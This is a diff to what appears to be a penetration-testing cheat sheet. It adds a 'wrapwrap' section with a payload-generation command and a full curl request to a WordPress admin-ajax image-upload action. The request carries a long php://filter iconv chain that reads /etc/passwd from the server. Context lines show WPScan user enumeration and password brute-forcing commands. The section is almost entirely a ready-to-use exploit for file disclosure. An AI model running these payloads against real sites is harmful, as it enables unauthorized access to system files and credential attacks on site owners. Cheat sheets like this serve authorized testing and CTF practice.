@@ -79,6 +79,7 @@
 - [WhatWeb](#whatweb)
 - [Wordpress](#wordpress)
 - [WPScan](#wpscan)
+- [wrapwrap](#wrapwrap)
 - [XML External Entity (XXE)](#xml-external-entity-xxe)
 - [XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)](#xsrfprobe-cross-site-request-forgery--csrf--xsrf)
 - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
@@ -4461,6 +4462,20 @@ $ wpscan --url https://<RHOST> --plugins-detection aggressive
 $ wpscan --url https://<RHOST> --disable-tls-checks
 $ wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
 $ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
+```
+
+## wrapwrap
+
+### Generating Payload
+
+```c
+$ python3 wrapwrap.py /etc/passwd "GIF89a" "" 1000
+```
+
+### Payload Execution
+
+```c
+$ curl 'http://<RHOST>/wp-admin/admin-ajax.php' -H "Content-Type: application/x-www-form-urlencoded" -d 'action=upload_image_from_url&id=1&url=php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd&accepted_files=image/gif'
 ```
 
 ## XML External Entity (XXE)
